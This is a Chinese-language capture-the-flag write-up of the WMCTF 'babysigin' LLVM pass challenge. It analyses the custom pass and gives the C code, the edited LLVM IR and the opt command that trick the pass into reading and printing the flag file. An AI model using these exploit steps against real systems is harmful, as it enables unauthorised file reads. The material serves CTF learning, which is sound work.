# babysigin
> 题目地址：
>

	首先我们拿到手的是`WMCTF.so`文件，IDA打开进行静态分析；

	既然这是一道LLVM PASS Pwn，我们首先需要知道做这种题目的时候是一个什么思路：

	首先找到`runOnFunction`是如何重写的，找到之后大致看下代码发现程序应该是调用四个函数，分别为`WMCTF_OPEN`，`;WMCTF_READ`，`WMCTF_MMAP`和`WMCTF_WRITE`。

## 静态分析
这一部分只会放部分分析代码，因为代码有点多。。。。

### WMCTF_OPEN
	首先是WMCTF_OPEN这个函数调用需要的字符串，即函数名；

![](https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914105649302.png)

	中间一部分是进行了一些对文件名及路径的判断，`LoadInst`典型是从上层函数或外部环境输入的。

![](https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914105822570.png)

	然后是调用父模块参数

![](https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914105901919.png)

### WMCTF_READ
![](https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914110010062.png)

	和OPEN部分差不多，获取第一个操作数之后转换为`llvm::ConstantInt`类型，并检查其是否为`0x6666`，若满足，就会读取文件0x40大小的内容分到`mmap_addr`处。

### WMCTF_MMAP
![](https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914110356185.png)

	同上，第一个操作数为`0x7890`，就会通过`mmap`函数来开辟一块内存给`mmap_addr`。

### WMCTF_WRITE
![](https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914110516912.png)

	检查第一个操作数是否为`llvm::LoadInst`类型，如果`LoadInst`的操作数为`llvm::GlobalVariable`，则判断其值是否为`0x8888`，满足这些条件会把`mmap_addr`的内容写到`&dword_0 + 1`，并根据操作结果输出成功或错误信息。

### 总结调用函数所需满足条件
+ WMCTF_OPEN：
    - 参数必须是上层函数传过来的，并有四个嵌套层次去检查参数；
+ WMCTF_READ:
    - 第一个操作数为`0x6666`；
+ WMCTF_MMAP:
    - 第一个操作数为`0x7890`；
+ WMCTF_WRITE:
    - 第一个操作数为`0x8888`,并且必须为全局变量。

## 解题
	`LLVM PASS Pwn`脚本编写分为三种语言，首先写C/C++代码用来利用漏洞，然后将其编译为`.ll`文件，最后用python导入后利用pwntools与题目进行交互。

### exp
	我们的C代码需要满足上文中的所有条件：

```plain
void WMCTF_OPEN(char *name);
void WMCTF_READ(int cmd);
void WMCTF_MMAP(int cmd);
void WMCTF_WRITE(int cmd);
char *filename = "./flag";
char *flag = "./flag";
int cmd = 0x8888;
void f0(char* name);
void f1(char* name);
void f2(char* name);
void f3(char* name);


void func0(char *name) {
        WMCTF_OPEN(filename);
}

void func1(char* name) {
        func0(filename);
}

void func2(char* name) {
        func1(filename);
}

void func3(char *name) {
        func2(filename);
}

void func4(char *name) {
        func3(flag);
}

void func5() {
        flag = "./flag";
        func4(flag);
}

void funcmain() {
    WMCTF_MMAP(0x7890);
    WMCTF_READ(0x6666);
    WMCTF_WRITE(cmd);
}
```

	OK，现在我们写了一个符合所有条件的C文件，现在需要给他编译成`.ll`文件：

```shell
clang-14 -emit-llvm -S main.c -o main.ll
```

	直接生成的文件需要修改，不然打不通：

![](https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914142406551.png)

	修改后`main.ll`内容：

```plain
; ModuleID = 'main.c'
source_filename = "main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

@.str = private unnamed_addr constant [7 x i8] c"./flag\00", align 1
@.addr = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8
@flag = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8
@cmd = dso_local global i32 34952, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func0(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @WMCTF_OPEN(i8* noundef %3)
  ret void
}

declare void @WMCTF_OPEN(i8* noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func1(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @func0(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func2(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @func1(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func3(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @func2(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func4(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @flag, align 8
  call void @func3(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func5() #0 {
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** @flag, align 8
  %1 = load i8*, i8** @flag, align 8
  call void @func4(i8* noundef %1)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @funcmain() #0 {
  call void @WMCTF_MMAP(i32 noundef 30864)
  call void @WMCTF_READ(i32 noundef 26214)
  %1 = load i32, i32* @cmd, align 4
  call void @WMCTF_WRITE(i32 noundef %1)
  ret void
}

declare void @WMCTF_MMAP(i32 noundef) #1

declare void @WMCTF_READ(i32 noundef) #1

declare void @WMCTF_WRITE(i32 noundef) #1

attributes #0 = { noinline nounwind optnone uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"Ubuntu clang version 14.0.0-1ubuntu1.1"}
```

```plain
opt-14 -load ./WMCTF.so -WMCTF -enable-new-pm=0 ./main.ll
```

![](https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914142330542.png)

改完之后

![](https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20240914150504565.png)

